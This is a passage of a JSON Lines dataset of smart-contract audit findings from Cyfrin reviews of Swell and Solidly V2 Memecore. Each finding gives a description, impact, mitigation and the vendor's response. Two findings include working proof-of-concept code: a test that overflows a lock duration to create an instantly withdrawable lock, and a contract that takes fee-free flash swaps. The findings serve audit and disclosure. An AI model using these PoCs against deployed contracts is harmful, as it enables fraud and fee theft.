"commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-023", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 23, "page_start": null, "title": "Refactor `RepricingOracle::handleReprice`, `_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas`", "short_summary": null, "description_md": null, "full_markdown": "### Refactor `RepricingOracle::handleReprice`, `_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas`\n\n**Description:** In `RepricingOracle::_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas` there is a lot of logic around whether to use the old snapshot or not, based around if `upgradeableRepriceSnapshot.meta.blockNumber == 0`.\n\nIf the idea is that the first time repricing occurs after the upgrade the execution path is `useOldSnapshot = true` but after that every time it will be `useOldSnapshot = false`, then it may make more sense to create functions just for that first execution which will only run once, then have functions for all the normal cases which come afterwards. This would avoid the extra gas costs and also simplify the code for all the future normal cases after the first-time-call special case.\n\nGas costs can also be reduced by having `handleReprice` load the snapshot struct, cache `upgradeableRepriceSnapshot.meta.blockNumber`, calculate `useOldSnapshot` once then pass these in as inputs to `_assertRepricingSnapshotValidity` and `_repricingPeriodDeltas` eg:\n\n```solidity\n\n  function handleReprice(\n    UpgradeableRepriceSnapshot calldata _snapshot\n  ) internal {\n    // only call getSnapshotStruct() once\n    UpgradeableRepriceSnapshot\n      storage upgradeableRepriceSnapshot = getSnapshotStruct();\n\n    // only calculate these once and pass them as required\n    uint256 ursMetaBlockNumber = upgradeableRepriceSnapshot.meta.blockNumber;\n    bool useOldSnapshot = ursMetaBlockNumber == 0;\n\n    // validation\n    _assertRepricingSnapshotValidity(_snapshot, ursMetaBlockNumber, useOldSnapshot);\n\n    _repricingPeriodDeltas(\n          reserveAssets,\n          _snapshot.state,\n          _snapshot.withdrawState,\n          upgradeableRepriceSnapshot,\n          useOldSnapshot\n        );\n\n    // delete the call to getSnapshotStruct() near the end of handleReprice()\n```\n\n\n**Swell:** Acknowledged. Will be addressed in a future upgrade when the old snapshot is no longer relevant. Swell will continue to pay the excess gas costs in the meantime.\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-02-23-cyfrin-swell-barracuda-024", "doc_id": "cyfrin_2024-02-23-cyfrin-swell-barracuda", "finding_index": 24, "page_start": null, "title": "Use constant for unchanging deposit amount", "short_summary": null, "description_md": null, "full_markdown": "### Use constant for unchanging deposit amount\n\n**Description:** In `DepositManager::setupValidators` there is no use in paying gas to declare then later read this variable which never changes:\n```solidity\nuint256 depositAmount = 32 ether;\n```\n\nRather simply define a constant:\n```solidity\nuint256 private constant DEPOSIT_AMOUNT = 32 ether;\n```\nAnd use that constant instead.\n\n**Swell:** Acknowledged.\n\n\\clearpage\n", "severity": "Gas", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SwellNetwork/v3-contracts-lst", "org": "SwellNetwork", "name": "v3-contracts-lst", "commit": "a95ea7942ba895ae84845ab7fec1163d667bee38", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-02-23-cyfrin-swell-barracuda.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.914761+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.915871+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Gas", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-001", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 1, "page_start": null, "title": "Locks can be created with expiry in the past", "short_summary": null, "description_md": null, "full_markdown": "### Locks can be created with expiry in the past\n\n**Description:** Due to a silent overflow in [`SolidityV2ERC42069::lockToken`](https://github.com/SolidlyLabs/v2-core/blob/757b18ad05780d2af22018b0c2c9d59422dc59d3/contracts/SolidlyV2-memecore.sol#L387), a sufficiently large duration will cause the unlock date to be in the past. This could allow the caller to create a fraudulent lock, advertising that they have locked for the maximum duration but which can actually be withdrawn immediately. However, the impact is somewhat limited as this will be visible to anyone who calls [`SolidityV2ERC42069::getLock(s)`](https://github.com/SolidlyLabs/v2-core/blob/757b18ad05780d2af22018b0c2c9d59422dc59d3/contracts/SolidlyV2-memecore.sol#L459-L471) with the owner's address (perhaps in a UI). From the attacker's perspective, the extension functionality could ideally be used to wrap around at will, hiding this malicious intent; however, this is not possible due to the checked math revert when incrementing the date.\n\n**Impact:** This bug has a high likelihood of being abused with a more limited impact; therefore, it is categorized as a medium-severity finding.\n\n**Proof of Concept:** Append this test to `MultiTest.js`:\n```javascript\nit(\"lock can be created in the past\", async function () {\n  const { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);\n\n  let token0 = test0;\n  let token1 = test1;\n\n  // Approve tokens for liquidity provision\n  await token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n  await token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n\n  // Provide liquidity\n  await router.connect(user1).addLiquidity(\n    token0.address,\n    token1.address,\n    ethers.utils.parseUnits(\"100\", 18),\n    ethers.utils.parseUnits(\"100\", 18),\n    0,\n    0,\n    user1.address,\n    ethers.constants.MaxUint256\n  );\n\n  const liquidityBalance = await pair.balanceOf(user1.address);\n\n  let blockTimestamp = (await ethers.provider.getBlock('latest')).timestamp;\n\n  let maxUint128 = ethers.BigNumber.from(\"340282366920938463463374607431768211455\");\n\n  // Lock LP tokens\n  await pair.connect(user1).lockToken(user1.address, liquidityBalance, maxUint128.sub(blockTimestamp));\n\n\n  let ret = await pair.getLock(user1.address, 0);\n  expect(ret.date).to.be.eq(0);\n});\n  ```\n**Recommended Mitigation:** Cast the timestamp to `uint128` prior to performing the addition rather than unsafely downcasting the result of the addition:\n\n```diff\nlocks[from].push(LockData({\n    amount: uint128(amount - fee),\n-     date: uint128(block.timestamp + duration)\n+     date: uint128(block.timestamp) + duration\n}));\n```\n\n**Solidly Labs:** Fixed in commit [14533e7](https://github.com/SolidlyLabs/v2-core/tree/14533e758f42009ca1d2cf4e98e2e7f33bcd4538).\n\n**Cyfrin:** Verified. The timestamp is first cast to `uint128` prior to performing the addition.\n\n\\clearpage\n", "severity": "Medium", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Medium", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-002", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 2, "page_start": null, "title": "Accounts blocked by the token cannot claim their fees", "short_summary": null, "description_md": null, "full_markdown": "### Accounts blocked by the token cannot claim their fees\n\n**Description:** In `SolidlyV2`, liquidity providers accrue fees from trades made in the pool. These fees are bound to the account holding the liquidity position at the time of trading as the fees are synced on transfers.\n\nWhen the liquidity provider wants to claim their fees they call `SolidlyV2Pair::claimFees`:\n```solidity\nif (feeState.feeOwed0 > 1) {\n    amount0 = feeState.feeOwed0 - 1;\n    _safeTransfer(token0, msg.sender, uint256(amount0));\n    feesClaimedLP0 += amount0;\n    feesClaimedTotal0 += amount0;\n    feeState.feeOwed0 = 1;\n}\n```\nHere the tokens are transferred to `msg.sender`.\n\nThe issue is that some tokens, such as `USDC`, have block lists where some accounts are blocked from receiving or doing transfers. Were this to happen to `msg.sender`, they would never be able to claim their fees, and these funds would be locked in the pool indefinitely.\n\n**Impact:** If an account is blocked by, for example, `USDC,` the user will not be able to claim their fees.\n\n**Recommended Mitigation:** Add a parameter `address to` to `SolidlyV2Pair::claimFees` so that the fees can be transferred to a different account.\n\n**Solidly Labs:** Acknowledged.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-003", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 3, "page_start": null, "title": "Consider a two-step ownership transfer", "short_summary": null, "description_md": null, "full_markdown": "### Consider a two-step ownership transfer\n\n**Description:** In the `SolidtlyV2-memecore` contracts the owner is set as `msg.sender` in `SolidlyV2Factory` when deployed.\n\nIt can also be changed using `SolidlyV2Factory::setOwner`:\n```solidity\n    function setOwner(address _newOwner) external {\n        require(msg.sender == owner);\n        owner = _newOwner;\n    }\n```\n\nHere there's a risk that the owner is lost if the new address not correct. This would result in some functionality not being available, like assigning new copilots and adjusting fees.\n\n**Impact:** The `owner` can mistakenly be given to an account that is out of the protocol's control.\n\n**Recommended Mitigation:** Consider implementing a two-step ownership transfer where `owner` first sets a `pendingOwner` then the `pendingOwner` can accept the new ownership , like OpenZeppelin [`Ownable2Step`](https://github.com/OpenZeppelin/openzeppelin-contracts/blob/master/contracts/access/Ownable2Step.sol)\n\n**Solidly Labs:** Acknowledged.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-004", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 4, "page_start": null, "title": "`SolidlyV2Pair::setPoolFee` fails to adequately consider fee setters defined by `SolidlyV2Factory`", "short_summary": null, "description_md": null, "full_markdown": "### `SolidlyV2Pair::setPoolFee` fails to adequately consider fee setters defined by `SolidlyV2Factory`\n\n**Description:** If a new `feeSetter` is registered by the owner of `SolidlyV2Factory`, then it is possible for the pool fee to be set below the minimum specified by the factory. This breaks the invariant that the pool fee should always be between the defined min/max values since it is only possible for the protocol to influence this value by explicitly modifying it on the factory itself, whereas a fee setter can modify it on the pool directly to become out of sync with the factory.\n\n```solidity\nfunction setPoolFee(uint16 _poolFee) external {\n    require(ISolidlyV2Factory(factory).isFeeSetter(msg.sender) || msg.sender == copilot, 'UA');\n    if (msg.sender == copilot) {\n        require(_poolFee >= ISolidlyV2Factory(factory).minFee() && !copilotRevoked); // minimum fee enforced for copilot\n    } else {\n        require(!protocolRevoked);\n    }\n    require(_poolFee <= 1000); // pool fee capped at 10%\n    uint16 feeOld = poolFee;\n    poolFee = _poolFee;\n    emit SetPoolFee(feeOld, _poolFee);\n}\n```\n\nAdditionally, if the owner of `SolidlyV2Factory` calls `SolidlyV2Pair::revokeFeeRole`, then registered fee setters are no longer able to call `SolidlyV2Pair::setPoolFee` despite no explicit consideration of fee setters.\n\n**Impact:**\n- The pool fee can become out of sync with `SolidlyV2Factory::minFee`.\n- Fee setters cannot set fees once the protocol has revoked its fee role.\n\n**Proof of Concept:**\n```javascript\nit(\"fee below min\", async function () {\n  const { user1, factory, pair } = await loadFixture(deploySolidlyV2Fixture);\n\n  await factory.setFeeSetter(user1.address, true);\n  pair.connect(user1).setPoolFee(0);\n  await factory.minFee().then(minFee => console.log(`SolidlyV2Factory::minFee: ${minFee}`));\n  await pair.poolFee().then(poolFee => console.log(`SolidlyV2Pair::poolFee: ${poolFee}`));\n\n  await pair.revokeFeeRole();\n  const minFee = await factory.minFee();\n  await expect(pair.connect(user1).setPoolFee(minFee)).to.revertedWithoutReason();\n});\n```\n\n**Recommended Mitigation:** Explicitly handle calls from fee setters as distinct from the factory owner in `SolidlyV2Pair::setPoolFee`, also enforcing that the pool fee cannot be set below the defined global minimum.\n\n**Solidly Labs:** Acknowledged. Both these things are like this by design – `feeSetters` are not constrained by `minFee`, and both protocol and `feeSetter` are considered the same for revoke.\n\n**Cyfrin:** Acknowledged.\n\n\\clearpage\n", "severity": "Low", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Low", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-005", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 5, "page_start": null, "title": "Flash loans can be taken for free", "short_summary": null, "description_md": null, "full_markdown": "### Flash loans can be taken for free\n\n**Description:** Unlike other AMM implementations, `SolidlyV2Pair` calculates fees independently for each underlying pool token. Showing just the `amount0Out` calculation:\n```solidity\nif (amount0Out > 0) {\n    uint256 amount1In = balance1 - (_reserve1 - amount1Out);\n    uint256 fee1 = _updateFees(1, amount1In, _poolFee, _protocolRatio);\n    _k(balance0, balance1 - fee1, uint256(_reserve0), uint256(_reserve1));\n    _updateReserves(balance0, (balance1 - fee1));\n    _emitSwap(0, amount1In, amount0Out, amount1Out, to);\n}\n```\n\nSince it is only possible to swap a single token, say `token0`, only `token0Out` will be non-zero. Since `amount1Out` is `0` the calculation `uint256 amount1In = balance1 - (_reserve1 - amount1Out);` will yield `amount1In = 0`. Hence, no fee will be charged.\n\n**Impact:** This has a high likelihood, but it is up to the project to determine the impact of being able to take flash swaps for free.\n\n**Proof of Concept:** Add this test to `MultiTest.js`:\n```javascript\nit(\"charges no fee for flashloans\", async function () {\nconst { user1, test0, test1, router, pair } = await loadFixture(deploySolidlyV2Fixture);\n\nlet token0 = test0;\nlet token1 = test1;\n\n\n// Approve tokens for liquidity provision\nawait token0.connect(user1).approve(router.address, ethers.constants.MaxUint256);\nawait token1.connect(user1).approve(router.address, ethers.constants.MaxUint256);\n\n// Provide liquidity\nawait router.connect(user1).addLiquidity(\n  token0.address,\n  token1.address,\n  ethers.utils.parseUnits(\"100\", 18),\n  ethers.utils.parseUnits(\"100\", 18),\n  0,\n  0,\n  user1.address,\n  ethers.constants.MaxUint256\n);\n\nconst FlashRecipient = await ethers.getContractFactory(\"FlashRecipient\");\nconst flashRecipient = await FlashRecipient.deploy(token0.address, pair.address);\n\n// doesn't revert\nawait flashRecipient.takeFlashloan();\n});\n```\n\nwith this file in `contracts/test/FlashRecipient.sol`:\n```solidity\n// SPDX-License-Identifier: MIT\npragma solidity ^0.8.19;\n\nimport {SolidlyV2Pair} from \"../SolidlyV2Pair.sol\";\nimport {IERC20} from \"./IERC20.sol\";\n\ncontract FlashRecipient {\n\n    IERC20 public token0;\n    SolidlyV2Pair public pair;\n\n    constructor(address _token0, address _pair) {\n        token0 = IERC20(_token0);\n        pair = SolidlyV2Pair(_pair);\n    }\n\n    function takeFlashloan() external {\n        pair.swap(1e18, 0, address(this), \"data\");\n    }\n\n    function solidlyV2Call(address , uint256 amount0Out, uint256, bytes memory) external returns (bool) {\n        // no fee being paid\n        token0.transfer(msg.sender, amount0Out);\n        return true;\n    }\n}\n```\n\n\n**Recommended Mitigation:** Calculate the fee for both sides, but only call `_updateFees()` if they have changed.\n\n**Solidly Labs:** Acknowledged. Flashloans are not a big market, especially with memecoins, we see more potential benefits in leaving them free of charge.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-006", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 6, "page_start": null, "title": "Lack of events emitted for state changes", "short_summary": null, "description_md": null, "full_markdown": "### Lack of events emitted for state changes\n\n**Description:** Events are useful to track contract changes off-chain. Hence emitting events for state changes is very valuable for off-chain monitoring and tracking of on-chain state.\n\n**Impact:** Important state changes can be missed in monitoring and off chain tracing.\n\n**Recommended Mitigation:** Consider emitting events for:\n* `SolidlyV2Factory::setOwner`\n* `SolidlyV2Factory::setFeeCollector`\n* `SolidlyV2Factory::setFeeSetter`\n* `SolidlyV2Pair::setCopilot`\n* `SolidlyV2Pair::revokeFeeRole`\n\nAlso consider emitting a special event when tokens are burnt (but kept tracked for fee accrual):\n* `SolidlyV2ERC42069::transferZero`\n* `SolidlyV2ERC42069::transferZeroFrom`\n\n**Solidly Labs:** Partially fixed. Most important events are covered, added `OwnerChanged` on factory. We're very constrained by bytecode space.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-007", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 7, "page_start": null, "title": "Secondary markets for LP tokens are problematic", "short_summary": null, "description_md": null, "full_markdown": "### Secondary markets for LP tokens are problematic\n\n**Description:** Unlike other AMM implementations, where fees are accrued in the LP token, Solidly V2 implements an accrual system where the fees are tracked in `feeGrowthGlobal0`/`1` per LP token. Each liquidity provider can call `SolidlyV2Pair::claimFees` to collect their accrued fees, with the benefit being that a liquidity provider does not have to burn their position to access the fees they have accrued.\n\nFee accrual is synced with every action that changes the balance: when claiming fees, mints, locks, and, most importantly, on any transfer of LP tokens or locked or burnt positions. This means that the fees accrued are bound to the account holding the liquidity position at that time.\n\nTherefore, if these tokens are traded or used as collateral on secondary markets, the fees accrued while in escrow would be lost as these contracts cannot, without modification and knowledge of the Solidly V2 Memecore system, claim fees.\n\n**Impact:** Using Solidly V2 Memecore LP tokens in AMMs, such as within Solidly V2 itself, or different escrow/collateral style contracts will cause fees to be lost.\n\n**Recommended Mitigation:** Be clear about this behavior in the documentation. For the LP tokens to be safely used in a pool of any sort, these would need an ERC-4626-style wrapper vault to be developed. The locked/burnt positions are not so concerning as they would need a custom-built implementation to be traded anyway, which would cater to this in its development..\n\n**Solidly Labs:** Acknowledged. Secondary markets for memecoin LPs are close to non-existent anyway. The most important functions with meme LP tokens are directly available in the core contracts.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
{"schema_version": "0.1", "scvd_id": "SCVD-cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2-008", "doc_id": "cyfrin_2024-05-04-cyfrin-solidly-v2-memecore-v2-2", "finding_index": 8, "page_start": null, "title": "Users can hide liquidity in low-duration locks", "short_summary": null, "description_md": null, "full_markdown": "### Users can hide liquidity in low-duration locks\n\n**Description:** One of the main features of SolidlyV2-memecore is the ability to lock liquidity for a period of time. This will transfer the liquidity to a `LockBox` contract, where it will be locked until the expiry (which is specified when locking).\n\nThis liquidity still accrues fees for the holder but is technically held by the `LockBox` contract. Thus `balanceOf` will show `0` for the account having the lock.\n\nThis could be used to \"hide\" liquidity as a user could have a lock with a `0` duration and then, when needing the liquidity, just withdraw the lock.\n\n**Impact:** A user could use locks to \"hide\" liquidity since a normal ERC20 `balanceOf` will not show it. However, there appears to be no clear way of abusing this, and hence, this is only for your information.\n\n**Recommended Mitigation:** If this is a concern, consider including locked liquidity as part of the `balanceOf`. This would break the ERC20 accounting, though, as the tokens would be double-counted on both the `LockBox` balance and the account balance.\n\n**Solidly Labs:** Acknowledged. Users can check that it's expired or close to expiry.\n\n**Cyfrin:** Acknowledged.\n", "severity": "Informational", "difficulty": null, "type": null, "finding_id": null, "target": {"path": null, "language": null, "chain": null, "contract_name": null, "contract_address": null, "function": null, "bytecode_hash": null, "caip_id": null}, "repo": {"url": "https://github.com/SolidlyLabs/v2-core", "org": "SolidlyLabs", "name": "v2-core", "commit": "757b18ad05780d2af22018b0c2c9d59422dc59d3", "branch": null, "relative_file": null, "lines": null}, "taxonomy": {"swc": [], "cwe": [], "tags": []}, "status": {"fix_status": null, "fixed_in_commit": null, "fixed_in_pr": [], "exploited_in_the_wild": null, "cvss": null, "bounty_reference": null}, "references": [], "provenance": {"source_pdf": "2024-05-04-cyfrin-solidly-v2-memecore-v2-2.md", "source_mtime": "2025-11-01T12:04:59+00:00", "report_extracted_at": "2025-11-12T02:04:23.918503+00:00", "report_extractor_version": "poc-0.4-md-no-llm", "report_extraction_tool": "marker+qwen3:8b", "scvd_normalized_at": "2025-11-12T02:04:23.919093+00:00", "scvd_normalizer_version": "poc-0.1"}, "metadata_raw": {"Severity": "Informational", "Difficulty": null, "Type": null, "Finding ID": null, "Target": null}}
